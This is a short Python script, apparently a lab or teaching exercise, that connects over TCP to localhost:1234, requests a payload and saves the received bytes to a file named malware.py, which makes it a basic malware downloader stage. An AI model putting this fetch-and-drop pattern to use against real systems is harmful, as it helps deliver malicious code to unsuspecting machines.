from socket import *

ip = "localhost"
port = 1234

def tcp():
    #create socket
    clientSocket = socket(AF_INET, SOCK_STREAM)
    clientSocket.settimeout(15.0)
    try: #connection and send message
        clientSocket.connect((ip, port))
        clientSocket.send("GET".encode())
        malware = clientSocket.recv(2048)
        malware = malware.decode()
    except: #timeout or connection refused
        exit()
    file = open("malware.py", "w")
    file.write(malware)
    clientSocket.close() #close socket

if __name__ == "__main__":
    tcp()
